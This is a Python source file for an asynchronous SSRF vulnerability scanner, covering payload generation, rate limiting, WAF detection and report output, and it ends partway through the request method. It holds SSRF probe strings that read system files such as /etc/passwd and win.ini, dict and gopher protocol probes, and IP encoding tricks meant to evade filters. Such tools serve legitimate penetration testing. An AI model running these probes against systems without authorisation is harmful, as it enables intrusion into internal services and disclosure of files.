import sys
import getopt
import os
import asyncio
import aiohttp
from aiohttp import ClientSession, ClientTimeout, TCPConnector
import json
import csv
from datetime import datetime
from urllib.parse import urlparse, quote, unquote, parse_qsl, urlencode, urlunparse
import logging
import random
import colorama
from colorama import Fore, Style
import base64
import ipaddress
import socket
import yaml
import jinja2
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List, Optional, Any, Set
import time
from collections import deque
import ssl
import threading


__version__ = 'version 1.0'



class Config:
    def __init__(self):
        self.scanner = {
            'concurrency': 200,  # Increased for better throughput
            'timeout': 15,  # Increased for reliability
            'retry_count': 2,
            'debug': False,
            'verify_ssl': False,
            'follow_redirects': True,
            'max_redirects': 3,
            'output_dir': "output",
            'user_agent': "SSRF-Scanner/1.0",
            'max_pool_size': 200,  # Reduced connection pool
            'capture_cookies': True,
            'proxy': None,  # Proxy URL
            'proxy_auth': None  # Proxy authentication
        }
        self.rate_limiting = {
            'requests_per_second': 100,  # Increased default rate
            'burst_size': 200,
            'min_rate': 10,
            'max_rate': 1000
        }
        self.output = {
            'format': 'json',  # json, csv, html, txt, all
            'verbose': False
        }

    def get(self, key, default=None):
        return self.scanner.get(key, default)

class ScanProgress:
    def __init__(self):
        self.phases = {
            'Local IP': 0,
            'Cloud Metadata': 0,
            'Protocol': 0,
            'Encoded': 0,
            'Parameter': 0,
            'Port Scan': 0,
            'DNS Rebinding': 0,
            'CRLF Injection': 0,
            'Scheme Confusion': 0,
            'Remote': 0
        }
        self.current_phase = None
        self.total_phases = len(self.phases)
        self.phase_weight = {
            'Local IP': 0.20,           # 20% of total weight
            'Cloud Metadata': 0.12,     # 12%
            'Protocol': 0.12,           # 12%
            'Encoded': 0.08,            # 8%
            'Parameter': 0.08,          # 8%
            'Port Scan': 0.08,          # 8%
            'DNS Rebinding': 0.08,      # 8%
            'CRLF Injection': 0.10,     # 10%
            'Scheme Confusion': 0.10,   # 10%
            'Remote': 0.04              # 4%
        }

    def update_phase(self, phase, progress):
        self.phases[phase] = progress
        self.current_phase = phase

    def get_total_progress(self):
        total = 0
        for phase, weight in self.phase_weight.items():
            total += self.phases[phase] * weight
        return total * 100

@dataclass
class ScanResult:
    url: str
    attack_type: str
    payload: str
    response_code: int
    response_size: int
    timestamp: datetime
    headers: Dict[str, str]
    is_vulnerable: bool
    verification_method: str = ""
    notes: str = ""

class PayloadGenerator:
    def __init__(self):
        self.ip_formats = ['decimal', 'hex', 'octal']
        self.url_encodings = ['single', 'double', 'base64']
        self.protocol_variations = ['standard', 'nested', 'mixed']

    def generate_ip_variations(self, ip):
        """Generate different IP format variations"""
        variations = set()  # Using set to avoid duplicates
        try:
            # Add original format
            variations.add(ip)
            
            # Handle special cases first
            if ip in ['localhost', 'internal', 'intranet']:
                variations.add(ip)
                variations.add('127.0.0.1')
                return list(variations)

            # Handle IPv6 addresses
            if ':' in ip:
                if '[' in ip:  # Bracketed IPv6
                    variations.add(ip)
                    variations.add(ip.strip('[]'))
                else:  # Regular IPv6
                    variations.add(ip)
                    variations.add(f'[{ip}]')
                return list(variations)

            # Handle domain names
            if any(c.isalpha() for c in ip):
                variations.add(ip)
                return list(variations)

            # Handle IPv4 addresses
            if '.' in ip:
                try:
                    # Standard IPv4 processing
                    parts = ip.split('.')
                    if len(parts) == 4:
                        # Original format
                        variations.add(ip)
                        
                        # Decimal format
                        try:
                            ipint = int.from_bytes(socket.inet_aton(ip), 'big')
                            variations.add(str(ipint))
                        except:
                            pass

                        # Hex format (per octet)
                        try:
                            hex_parts = [hex(int(part))[2:] for part in parts]
                            variations.add('.'.join(f"0x{part}" for part in hex_parts))
                        except:
                            pass

                        # Octal format (per octet)
                        try:
                            oct_parts = [oct(int(part))[2:] for part in parts]
                            variations.add('.'.join(f"0{part}" for part in oct_parts))
                        except:
                            pass

                        # Mixed format
                        try:
                            variations.add(f"{parts[0]}.{int(parts[1])}.{hex(int(parts[2]))[2:]}.{oct(int(parts[3]))[2:]}")
                        except:
                            pass

                except Exception as e:
                    logging.debug(f"Error processing IPv4 address {ip}: {str(e)}")

            # Handle hexadecimal format
            elif ip.startswith('0x'):
                try:
                    dec = int(ip[2:], 16)
                    ip_bytes = dec.to_bytes(4, 'big')
                    variations.add('.'.join(str(b) for b in ip_bytes))
                except:
                    variations.add(ip)

            # Handle octal format
            elif ip.startswith('0'):
                try:
                    dec = int(ip, 8)
                    ip_bytes = dec.to_bytes(4, 'big')
                    variations.add('.'.join(str(b) for b in ip_bytes))
                except:
                    variations.add(ip)

            # Add URL encoded variations for all generated IPs
            current_variations = variations.copy()
            for var in current_variations:
                variations.add(quote(var))
                variations.add(quote(quote(var)))

        except Exception as e:
            logging.debug(f"Error generating variations for {ip}: {str(e)}")
            variations.add(ip)  # Keep original IP if processing fails

        return list(variations)

    def generate_url_encodings(self, url):
        """Generate different URL encoding variations"""
        variations = set()
        try:
            # Original URL
            variations.add(url)
            
            # Single encode
            variations.add(quote(url))
            
            # Double encode
            variations.add(quote(quote(url)))
            
            # Base64
            variations.add(base64.b64encode(url.encode()).decode())
            
            # Mixed encoding
            variations.add(quote(url).replace('%', '%25'))
            
            # URL encoding variations
            variations.add(url.replace('.', '%2e'))
            variations.add(url.replace('/', '%2f'))
            
            # Unicode variations
            variations.add(url.replace('.', '。'))  # Unicode full stop
            variations.add(url.replace('/', '／'))  # Unicode forward slash
            
        except Exception as e:
            logging.debug(f"Error generating URL encodings for {url}: {str(e)}")
            variations.add(url)
        
        return list(variations)

    def generate_protocol_variations(self, protocol, payload):
        """Generate protocol-specific payload variations"""
        variations = set()
        try:
            # Standard protocol
            variations.add(f"{protocol}://{payload}")
            
            # Protocol with double slash variation
            variations.add(f"{protocol}:/{payload}")
            variations.add(f"{protocol}:///{payload}")
            
            # Nested protocols
            variations.add(f"{protocol}://{protocol}://{payload}")
            
            # Mixed case protocols
            variations.add(f"{protocol.upper()}://{payload}")
            variations.add(f"{protocol.title()}://{payload}")
            
            # URL encoded protocol
            variations.add(f"{quote(protocol)}://{payload}")
            
        except Exception as e:
            logging.error(f"Error generating protocol variations for {protocol}: {str(e)}")
        
        return list(variations)

class ProtocolHandler:
    def __init__(self):
        self.generator = PayloadGenerator()

    def handle_gopher(self, payload):
        """Handle Gopher protocol specific payloads"""
        variations = []
        try:
            # Standard gopher
            variations.append(f"gopher://{payload}")
            
            # Gopher with specific port
            variations.append(f"gopher://{payload}:70")
            
            # Gopher with subdirectories
            variations.append(f"gopher://{payload}/1")
            
            # URL encoded variations
            variations.extend(self.generator.generate_url_encodings(f"gopher://{payload}"))
            
        except Exception as e:
            logging.error(f"Error handling gopher protocol: {str(e)}")
        
        return variations

    def handle_dict(self, payload):
        """Handle Dict protocol specific payloads"""
        variations = []
        try:
            # Standard dict
            variations.append(f"dict://{payload}")
            
            # Dict with commands
            variations.append(f"dict://{payload}/d:password")
            variations.append(f"dict://{payload}/show:db")
            
            # Dict with auth attempts
            variations.append(f"dict://dict:dict@{payload}")
            
        except Exception as e:
            logging.error(f"Error handling dict protocol: {str(e)}")
        
        return variations

    def handle_file(self, payload):
        """Handle File protocol specific payloads"""
        variations = []
        try:
            # Standard file
            variations.append(f"file://{payload}")
            
            # Common file paths
            variations.append(f"file:///{payload}")
            variations.append(f"file:///etc/passwd")
            variations.append(f"file:///windows/win.ini")
            
            # Directory traversal combinations
            variations.append(f"file://../{payload}")
            variations.append(f"file:///./{payload}")
            
        except Exception as e:
            logging.error(f"Error handling file protocol: {str(e)}")
        
        return variations

class Reporter:
    def __init__(self, output_dir: str, output_format: str = 'all'):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.results: List[ScanResult] = []
        self.output_format = output_format
        self.txt_output = self.output_dir / 'report.txt'
        self.json_output = self.output_dir / 'report.json'
        self.csv_output = self.output_dir / 'report.csv'
        self.html_output = self.output_dir / 'report.html'

    def add_result(self, result: ScanResult):
        """Add a scan result to the report"""
        self.results.append(result)
        self._write_result(result)

    def _write_result(self, result: ScanResult):
        """Write result to configured output formats in real-time"""
        formats = self.output_format.lower().split(',') if ',' in self.output_format else [self.output_format.lower()]
        
        if 'all' in formats or 'txt' in formats:
            self._write_txt(result)
        
        if 'all' in formats or 'csv' in formats:
            self._write_csv(result)
        
        if 'all' in formats or 'json' in formats:
            self._write_json(result)
    
    def _write_txt(self, result: ScanResult):
        """Write to TXT format"""
        with open(self.txt_output, 'a') as f:
            f.write(f"\nPotential SSRF Found!\n")
            f.write(f"URL: {result.url}\n")
            f.write(f"Attack Type: {result.attack_type}\n")
            f.write(f"Payload: {result.payload}\n")
            f.write(f"Response Code: {result.response_code}\n")
            f.write(f"Response Size: {result.response_size}\n")
            f.write(f"Verification Method: {result.verification_method}\n")
            f.write(f"Notes: {result.notes}\n")
            f.write("-" * 50 + "\n")
    
    def _write_csv(self, result: ScanResult):
        """Write to CSV format"""
        with open(self.csv_output, 'a', newline='') as f:
            writer = csv.writer(f)
            if f.tell() == 0:  # Write header if file is empty
                writer.writerow([
                    'URL', 'Attack Type', 'Payload', 'Response Code',
                    'Response Size', 'Verification Method', 'Timestamp', 'Notes'
                ])
            writer.writerow([
                result.url, result.attack_type, result.payload,
                result.response_code, result.response_size,
                result.verification_method, result.timestamp, result.notes
            ])
    
    def _write_json(self, result: ScanResult):
        """Write to JSON format"""
        results_json = []
        if self.json_output.exists():
            with open(self.json_output, 'r') as f:
                try:
                    results_json = json.load(f)
                except json.JSONDecodeError:
                    results_json = []

        results_json.append({
            'url': result.url,
            'attack_type': result.attack_type,
            'payload': result.payload,
            'response_code': result.response_code,
            'response_size': result.response_size,
            'verification_method': result.verification_method,
            'timestamp': result.timestamp.isoformat(),
            'notes': result.notes
        })

        with open(self.json_output, 'w') as f:
            json.dump(results_json, f, indent=2)

    def generate_summary(self) -> str:
        """Generate final summary report"""
        stats = self._calculate_statistics()
        
        summary = "\n" + "="*50 + "\n"
        summary += "SSRF Scan Summary\n"
        summary += "="*50 + "\n\n"
        
        # Add statistics
        summary += "Statistics:\n"
        summary += "-"*20 + "\n"
        for key, value in stats.items():
            summary += f"{key}: {value}\n"
        
        # Add vulnerability breakdown
        summary += "\nVulnerabilities by Attack Type:\n"
        summary += "-"*30 + "\n"
        grouped = self._group_vulnerabilities()
        for attack_type, results in grouped.items():
            summary += f"{attack_type}: {len(results)} found\n"
        
        summary += "\n" + "="*50 + "\n"
        summary += f"Detailed results saved in:\n"
        
        formats = self.output_format.lower().split(',') if ',' in self.output_format else [self.output_format.lower()]
        if 'all' in formats or 'txt' in formats:
            summary += f"Text Report: {self.txt_output}\n"
        if 'all' in formats or 'csv' in formats:
            summary += f"CSV Report: {self.csv_output}\n"
        if 'all' in formats or 'json' in formats:
            summary += f"JSON Report: {self.json_output}\n"
        if 'all' in formats or 'html' in formats:
            summary += f"HTML Report: {self.html_output}\n"
        
        # Write summary to file
        with open(self.output_dir / 'summary.txt', 'w') as f:
            f.write(summary)
        
        # Generate HTML report if requested
        if 'all' in formats or 'html' in formats:
            self._generate_html_report(stats, grouped)
        
        return summary
    
    def _generate_html_report(self, stats: Dict, grouped: Dict):
        """Generate HTML report"""
        html = """<!DOCTYPE html>
<html>
<head>
    <title>SSRF Scanner Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h1 { color: #333; border-bottom: 3px solid #e74c3c; padding-bottom: 10px; }
        h2 { color: #555; margin-top: 30px; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; }
        .stat-card { background: #ecf0f1; padding: 15px; border-radius: 5px; border-left: 4px solid #3498db; }
        .stat-label { font-size: 12px; color: #7f8c8d; text-transform: uppercase; }
        .stat-value { font-size: 24px; font-weight: bold; color: #2c3e50; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th { background: #34495e; color: white; padding: 12px; text-align: left; }
        td { padding: 10px; border-bottom: 1px solid #ddd; }
        tr:hover { background: #f8f9fa; }
        .vuln-high { color: #e74c3c; font-weight: bold; }
        .vuln-medium { color: #f39c12; }
        .vuln-low { color: #27ae60; }
        .attack-type { display: inline-block; padding: 4px 8px; background: #3498db; color: white; border-radius: 3px; font-size: 12px; }
        .timestamp { color: #7f8c8d; font-size: 12px; }
        .payload { font-family: monospace; background: #ecf0f1; padding: 2px 6px; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 SSRF Scanner Report</h1>
        <p class="timestamp">Generated: """ + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + """</p>
        
        <h2>📊 Statistics</h2>
        <div class="stats">
"""
        
        for key, value in stats.items():
            html += f"""
            <div class="stat-card">
                <div class="stat-label">{key}</div>
                <div class="stat-value">{value}</div>
            </div>
"""
        
        html += """
        </div>
        
        <h2>🎯 Vulnerabilities by Attack Type</h2>
        <table>
            <tr>
                <th>Attack Type</th>
                <th>Count</th>
                <th>Percentage</th>
            </tr>
"""
        
        total_vulns = sum(len(results) for results in grouped.values())
        for attack_type, results in grouped.items():
            percentage = (len(results) / total_vulns * 100) if total_vulns > 0 else 0
            html += f"""
            <tr>
                <td><span class="attack-type">{attack_type}</span></td>
                <td>{len(results)}</td>
                <td>{percentage:.1f}%</td>
            </tr>
"""
        
        html += """
        </table>
        
        <h2>🚨 Detailed Findings</h2>
        <table>
            <tr>
                <th>URL</th>
                <th>Attack Type</th>
                <th>Payload</th>
                <th>Response Code</th>
                <th>Size</th>
                <th>Timestamp</th>
            </tr>
"""
        
        for result in self.results[:100]:  # Limit to first 100 for performance
            severity_class = 'vuln-high' if result.response_code in [200, 301, 302] else 'vuln-medium'
            html += f"""
            <tr>
                <td>{result.url[:50]}...</td>
                <td><span class="attack-type">{result.attack_type}</span></td>
                <td><span class="payload">{result.payload[:40]}...</span></td>
                <td class="{severity_class}">{result.response_code}</td>
                <td>{result.response_size}</td>
                <td class="timestamp">{result.timestamp.strftime("%H:%M:%S")}</td>
            </tr>
"""
        
        if len(self.results) > 100:
            html += f"""
            <tr>
                <td colspan="6" style="text-align: center; color: #7f8c8d;">
                    ... and {len(self.results) - 100} more results (see JSON/CSV for complete data)
                </td>
            </tr>
"""
        
        html += """
        </table>
    </div>
</body>
</html>
"""
        
        with open(self.html_output, 'w') as f:
            f.write(html)

    def _calculate_statistics(self) -> Dict[str, Any]:
        """Calculate summary statistics"""
        total_urls = len(set(r.url for r in self.results))
        total_vulnerabilities = len([r for r in self.results if r.is_vulnerable])
        
        # Get actual request counts from scanner if available
        from_scanner = hasattr(self, '_scanner_stats')
        
        return {
            'Total URLs Scanned': total_urls,
            'Total Requests': self._scanner_stats['total_attempted'] if from_scanner else len(self.results),
            'Vulnerabilities Found': total_vulnerabilities,
            'Success Rate': f"{self._scanner_stats['success_rate']:.1f}%" if from_scanner else f"{(total_vulnerabilities / len(self.results)) * 100:.1f}%" if self.results else "0%",
            'Unique Attack Types': len(set(r.attack_type for r in self.results))
        }

    def _group_vulnerabilities(self) -> Dict[str, List[ScanResult]]:
        """Group vulnerabilities by type"""
        grouped = {}
        for result in self.results:
            if result.is_vulnerable:
                if result.attack_type not in grouped:
                    grouped[result.attack_type] = []
                grouped[result.attack_type].append(result)
        return grouped

class ConfigManager:
    def __init__(self, config_file: str = 'config.yaml'):
        self.config_file = Path(config_file)
        self.config = self._load_default_config()
        if self.config_file.exists():
            self.load_config()

    def _load_default_config(self) -> Dict[str, Any]:
        """Load default configuration"""
        return {
            'scanner': {
                'threads': 40,
                'timeout': 3,
                'retry_count': 2,
                'verify_ssl': False,
                'follow_redirects': True,
                'max_redirects': 3,
                'user_agent': 'SSRF-Scanner/1.0',
                'max_pool_size': 100
            },
            'rate_limiting': {
                'requests_per_second': 10,
                'burst_size': 20,
                'min_rate': 0.5,
                'max_rate': 50
            },
            'attacks': {
                'enabled': {
                    'local_ip': True,
                    'cloud_metadata': True,
                    'protocol': True,
                    'encoded': True,
                    'parameter': True,
                    'port_scan': True,
                    'dns_rebinding': True
                },
                'custom_payloads': []
            },
            'reporting': {
                'output_dir': 'output',
                'formats': ['html', 'csv', 'json'],
                'include_charts': True
            },
            'logging': {
                'level': 'INFO',
                'file': 'ssrf_scanner.log',
                'format': '%(asctime)s - %(levelname)s - %(message)s'
            }
        }

    def load_config(self):
        """Load configuration from file"""
        try:
            with self.config_file.open('r') as f:
                file_config = yaml.safe_load(f)
                self.config = self._merge_configs(self.config, file_config)
        except Exception as e:
            logging.error(f"Error loading config file: {e}")

    def save_config(self):
        """Save current configuration to file"""
        try:
            with self.config_file.open('w') as f:
                yaml.dump(self.config, f, default_flow_style=False)
        except Exception as e:
            logging.error(f"Error saving config file: {e}")

    def _merge_configs(self, default: Dict, override: Dict) -> Dict:
        """Deep merge two configurations"""
        merged = default.copy()
        
        for key, value in override.items():
            if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
                merged[key] = self._merge_configs(merged[key], value)
            else:
                merged[key] = value
                
        return merged

    def update_config(self, section: str, key: str, value: Any):
        """Update specific configuration value"""
        if section in self.config:
            if isinstance(self.config[section], dict):
                self.config[section][key] = value
            else:
                self.config[section] = {key: value}
        else:
            self.config[section] = {key: value}

    def get_config(self, section: str = None) -> Any:
        """Get configuration section or full config"""
        if section:
            return self.config.get(section, {})
        return self.config

class RateLimiter:
    def __init__(self, requests_per_second: float, burst_size: int = 100):
        self.rate = requests_per_second
        self.burst_size = burst_size
        self.tokens = burst_size
        self.last_update = time.time()
        self.lock = asyncio.Lock()
        self.request_history = deque(maxlen=10000)
        
        # Adaptive rate limiting parameters
        self.error_count = 0
        self.success_count = 0
        self.adaptive_rate = requests_per_second
        self.min_rate = 10
        self.max_rate = requests_per_second * 2

    async def wait(self) -> bool:
        """Async wait for rate limit"""
        async with self.lock:
            now = time.time()
            time_passed = now - self.last_update
            self.tokens = min(
                self.burst_size,
                self.tokens + time_passed * self.rate
            )
            
            if self.tokens >= 1:
                self.tokens -= 1
                self.last_update = now
                self.request_history.append(now)
                return True
            
            # Calculate wait time
            wait_time = (1 - self.tokens) / self.rate
            await asyncio.sleep(wait_time)
            
            self.tokens -= 1
            self.last_update = time.time()
            self.request_history.append(self.last_update)
            return True

    async def adjust_rate(self, success: bool):
        """Dynamically adjust the rate based on success/failure"""
        async with self.lock:
            if success:
                self.success_count += 1
                self.error_count = max(0, self.error_count - 1)
                
                if self.success_count > 50:
                    self.adaptive_rate = min(
                        self.max_rate,
                        self.adaptive_rate * 1.2
                    )
                    self.success_count = 0
            else:
                self.error_count += 1
                self.success_count = 0
                
                if self.error_count > 5:
                    self.adaptive_rate = max(
                        self.min_rate,
                        self.adaptive_rate * 0.7
                    )
                    self.error_count = 0
            
            self.rate = self.adaptive_rate

class SmartThrottler:
    def __init__(self):
        self.rate_limiter = RateLimiter(requests_per_second=1000)
        self.backoff_time = 0.1
        self.max_backoff = 5.0
        self.success_threshold = 20
        self.consecutive_successes = 0
        self.consecutive_failures = 0
        self.lock = asyncio.Lock()

    async def pre_request(self):
        """Called before making a request"""
        await self.rate_limiter.wait()

    async def post_request(self, success: bool):
        """Called after a request completes"""
        async with self.lock:
            if success:
                self.consecutive_successes += 1
                self.consecutive_failures = 0
                await self._decrease_backoff()
            else:
                self.consecutive_failures += 1
                self.consecutive_successes = 0
                await self._increase_backoff()
            
            await self.rate_limiter.adjust_rate(success)

    async def _increase_backoff(self):
        """Increase backoff time after failures"""
        self.backoff_time = min(
            self.max_backoff,
            self.backoff_time * 1.5
        )
        await asyncio.sleep(self.backoff_time)

    async def _decrease_backoff(self):
        """Decrease backoff time after successes"""
        if self.consecutive_successes >= self.success_threshold:
            self.backoff_time = max(
                0.1,
                self.backoff_time * 0.5
            )

class ErrorHandler:
    def __init__(self):
        self.throttler = SmartThrottler()
        self.max_retries = 3
        self.timeout_multiplier = 1.5
        self.current_timeout = 10
        self.error_counts: Dict[str, int] = {}
        self.waf_signatures = [
            'blocked',
            'forbidden',
            'waf',
            'security',
            'cloudflare',
            'protection'
        ]

    async def handle_error(self, url: str, error: Exception, response: Optional[aiohttp.ClientResponse] = None) -> bool:
        """Handle different types of errors and return True if request should be retried"""
        error_type = type(error).__name__
        self.error_counts[error_type] = self.error_counts.get(error_type, 0) + 1

        if isinstance(error, asyncio.TimeoutError):
            return await self.handle_timeout()
        elif isinstance(error, aiohttp.ClientError):
            if response and await self._detect_waf(response):
                return await self.handle_waf(url)
            return await self.handle_general_error()
        
        return False

    async def handle_timeout(self) -> bool:
        """Handle timeout errors"""
        self.current_timeout *= self.timeout_multiplier
        await self.throttler.post_request(success=False)
        return True

    async def handle_connection_error(self) -> bool:
        """Handle connection errors"""
        await asyncio.sleep(random.uniform(0.1, 0.5))
        await self.throttler.post_request(success=False)
        return True

    async def handle_waf(self, url: str) -> bool:
        """Handle WAF detection"""
        logging.warning(f"WAF detected for {url}. Adjusting strategy...")
        self.throttler.backoff_time *= 2
        await asyncio.sleep(random.uniform(1, 3))
        return True

    async def handle_general_error(self) -> bool:
        """Handle general errors"""
        should_retry = self.error_counts.get('general', 0) < self.max_retries
        if should_retry:
            await asyncio.sleep(random.uniform(0.1, 0.3))
        return should_retry

    async def _detect_waf(self, response: aiohttp.ClientResponse) -> bool:
        """Detect if response indicates WAF presence"""
        if response.status in [403, 406, 429, 456]:
            return True
            
        try:
            response_text = (await response.text()).lower()
            response_headers = str(response.headers).lower()
            
            for signature in self.waf_signatures:
                if signature in response_text or signature in response_headers:
                    return True
        except:
            pass
        
        return False

    def reset_error_counts(self):
        """Reset error counters"""
        self.error_counts.clear()
        self.current_timeout = 10

class RequestManager:
    def __init__(self, config):
        self.error_handler = ErrorHandler()
        self.throttler = SmartThrottler()
        self.config = config
        self.session = None

    async def create_session(self):
        """Create and configure aiohttp session"""
        # Use system DNS resolver instead of aiodns to avoid timeout issues
        connector = TCPConnector(
            limit=self.config.scanner['max_pool_size'],
            limit_per_host=50,
            ttl_dns_cache=300,
            ssl=False if not self.config.scanner['verify_ssl'] else ssl.create_default_context(),
            use_dns_cache=True,
            family=0  # Allow both IPv4 and IPv6
        )
        
        timeout = ClientTimeout(
            total=self.config.scanner['timeout'] * 2,  # Double timeout for DNS + request
            connect=self.config.scanner['timeout'],
            sock_read=self.config.scanner['timeout'],
            sock_connect=self.config.scanner['timeout']
        )
        
        # Configure proxy if provided
        session_kwargs = {
            'connector': connector,
            'timeout': timeout,
            'headers': {'User-Agent': self.config.scanner['user_agent']}
        }
        
        # Add proxy configuration
        if self.config.scanner.get('proxy'):
            session_kwargs['trust_env'] = True
        
        self.session = ClientSession(**session_kwargs)
        return self.session

    async def close_session(self):
        """Close the aiohttp session"""
        if self.session:
            await self.session.close()

    async def make_request(self, url: str, method: str = 'GET', **kwargs) -> Optional[aiohttp.ClientResponse]:
        """Make an async request with error handling and rate limiting"""
        retries = 0
        max_retries = 3

        while retries < max_retries:
            try:
                await self.throttler.pre_request()
                
                async with self.session.request(method, url, **kwargs) as response:
                    # Read response to ensure it's complete
                    await response.read()
                    await self.throttler.post_request(success=True)
                    self.error_handler.reset_error_counts()
                    return response

            except Exception as e:
                retries += 1
                should_retry = await self.error_handler.handle_error(url, e, None)
                
                if not should_retry or retries >= max_retries:
                    if self.config.scanner['debug']:
                        logging.error(f"Max retries reached for {url}: {str(e)}")
                    return None

        return None

class SSRFScanner:
    def __init__(self):
        printBanner()
        
        # Initialize configuration
        self.config = Config()
        
        # Initialize components
        self.request_manager = RequestManager(self.config)
        self.error_handler = ErrorHandler()
        self.throttler = SmartThrottler()
        self.payload_generator = PayloadGenerator()
        self.protocol_handler = ProtocolHandler()
        
        # Static headers applied to all requests (set via -H/--header)
        self.static_headers = {}
        
        # Initialize async primitives
        self.semaphore = None  # Will be created in async context
        self.lock = None  # Async lock, created in async context
        self.file_lock = None  # Threading lock for file I/O
        
        # Setup logging first
        self.setup_logging()
        
        # Initialize payload lists
        self.local_ips = []
        self.headers = []
        self.cloud_metadata = []
        self.protocols = []
        self.encoded_payloads = []
        self.parameter_payloads = []
        self.port_payloads = []
        self.dns_rebinding = []
        self.crlf_injection = []
        self.scheme_confusion = []
        
        # Initialize counters and settings
        self.nrTotUrls = 0
        self.nrUrlsAnalyzed = 0
        self.nrErrorUrl = 0
        self.backurl = ""
        self.cookies = None
        self.quiet_mode = False
        
        # Request tracking
        self.total_requests_attempted = 0
        self.total_requests_succeeded = 0
        self.total_requests_failed = 0
        self.failure_reasons = {}
        self.response_codes = {}  # Track response codes
        self.scan_start_time = None
        
        # Initialize progress tracking
        self.progress = ScanProgress()
        
        # Setup output
        self.output_filename = datetime.now().strftime("%Y_%m_%d-%I_%M_%S_%p")
        self.setup_output_files()
        
        # Load payloads last
        self.load_all_payloads()
        
        # Initialize reporter (will be updated with format in run())
        self.reporter = None


    def setup_logging(self):
        """Setup logging configuration"""
        logging.basicConfig(
            level=logging.INFO if not self.config.scanner['debug'] else logging.DEBUG,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger('ssrf_scanner')

    def setup_output_files(self):
        """Setup output directory and files"""
        self.output_dir = f"output/{self.output_filename}"
        os.makedirs(self.output_dir, exist_ok=True)
        self.txt_output = f"{self.output_dir}/scan.txt"
        self.csv_output = f"{self.output_dir}/scan.csv"
        self.json_output = f"{self.output_dir}/scan.json"

    def load_all_payloads(self):
        """Load all payload files from the payloads directory"""
        payload_dir = "payloads"
        
        # Create payloads directory if it doesn't exist
        if not os.path.exists(payload_dir):
            os.makedirs(payload_dir)
            self.logger.warning(f"Created {payload_dir} directory")
        
        payload_files = {
            'local_ips.txt': self.local_ips,
            'headers.txt': self.headers,
            'cloud_metadata.txt': self.cloud_metadata,
            'protocols.txt': self.protocols,
            'encoded_payloads.txt': self.encoded_payloads,
            'parameter_payloads.txt': self.parameter_payloads,
            'port_payloads.txt': self.port_payloads,
            'dns_rebinding.txt': self.dns_rebinding,
            'crlf_injection.txt': self.crlf_injection,
            'scheme_confusion.txt': self.scheme_confusion
        }

        for filename, payload_list in payload_files.items():
            filepath = os.path.join(payload_dir, filename)
            try:
                if not os.path.exists(filepath):
                    # Create empty file if it doesn't exist
                    with open(filepath, 'w') as f:
                        f.write("# Add your payloads here\n")
                    self.logger.warning(f"Created empty payload file: {filename}")
                else:
                    with open(filepath, 'r') as f:
                        payload_list.extend([line.strip() for line in f if line.strip() and not line.startswith('#')])
                        self.logger.info(f"Loaded {len(payload_list)} payloads from {filename}")
            except Exception as e:
                self.logger.error(f"Error processing {filename}: {str(e)}")

    async def make_request(self, url, method='GET', headers=None, timeout=None):
        """Async request method with rate limiting and error handling"""
        try:
            default_headers = {
                'User-Agent': self.config.scanner['user_agent'],
                'Accept': '*/*'
            }

            # Apply static headers set from CLI (-H/--header), e.g. Authorization
            if hasattr(self, "static_headers") and self.static_headers:
                default_headers.update(self.static_headers)            
           
            if headers:
                default_headers.update(headers)

            if self.cookies:
                if isinstance(self.cookies, str):
                    default_headers['Cookie'] = self.cookies
                elif isinstance(self.cookies, dict):
                    default_headers['Cookie'] = '; '.join([f'{k}={v}' for k, v in self.cookies.items()])

            # Prepare request kwargs
            request_kwargs = {
                'method': method,
                'url': url,
                'headers': default_headers,
                'timeout': ClientTimeout(total=timeout or self.config.scanner['timeout']),
                'ssl': False if not self.config.scanner['verify_ssl'] else None,
                'allow_redirects': self.config.scanner['follow_redirects']
            }
            
            # Add proxy if configured
            if self.config.scanner.get('proxy'):
                request_kwargs['proxy'] = self.config.scanner['proxy']
                if self.config.scanner.get('proxy_auth'):
                    auth_parts = self.config.scanner['proxy_auth'].split(':')
                    if len(auth_parts) == 2:
                        request_kwargs['proxy_auth'] = aiohttp.BasicAuth(auth_parts[0], auth_parts[1])

            self.total_requests_attempted += 1
            
            async with self.semaphore:
                async with self.request_manager.session.request(**request_kwargs) as response:
                    # Read response body
                    body = await response.read()
                    
                    # Track successful request
                    self.total_requests_succeeded += 1
                    
                    # Track response code
                    status_code = response.status
                    self.response_codes[status_code] = self.response_codes.get(status_code, 0) + 1
                    
                    # Update progress every 10 successful requests
                    if self.total_requests_succeeded % 10 == 0:
                        self.print_progress()
                    
                    # Check for Set-Cookie header
                    if self.config.scanner['capture_cookies'] and 'Set-Cookie' in response.headers and not self.cookies:
                        self.cookies = response.headers['Set-Cookie']
                        if self.config.scanner['debug']:
                            self.logger.info(f"Captured cookies from response")

                    # Create a response-like object with necessary attributes
                    class ResponseWrapper:
                        def __init__(self, status, headers, body, url):
                            self.status_code = status
                            self.headers = headers
                            self.content = body
                            self.text = body.decode('utf-8', errors='ignore')
                            self.url = url
                            self.elapsed = None
                    
                    return ResponseWrapper(response.status, response.headers, body, url)
            
        except asyncio.TimeoutError:
            self.total_requests_failed += 1
            self.failure_reasons['timeout'] = self.failure_reasons.get('timeout', 0) + 1
            # Update progress on failures too
            if self.total_requests_failed % 50 == 0:
                self.print_progress()
            if self.config.scanner['debug']:
                self.logger.error(f"Timeout for {url}")
            return None
        except aiohttp.ClientError as e:
            self.total_requests_failed += 1
            error_type = type(e).__name__
            self.failure_reasons[error_type] = self.failure_reasons.get(error_type, 0) + 1
            # Update progress on failures too
            if self.total_requests_failed % 50 == 0:
                self.print_progress()
            if self.config.scanner['debug']:
                self.logger.error(f"Client error for {url}: {str(e)}")
            return None
        except Exception as e:
            self.total_requests_failed += 1
            error_type = type(e).__name__
            self.failure_reasons[error_type] = self.failure_reasons.get(error_type, 0) + 1
            # Update progress on failures too
            if self.total_requests_failed % 50 == 0:
                self.print_progress()
            if self.config.scanner['debug']:
                self.logger.error(f"Request failed for {url}: {error_type}: {str(e)}")
            return None


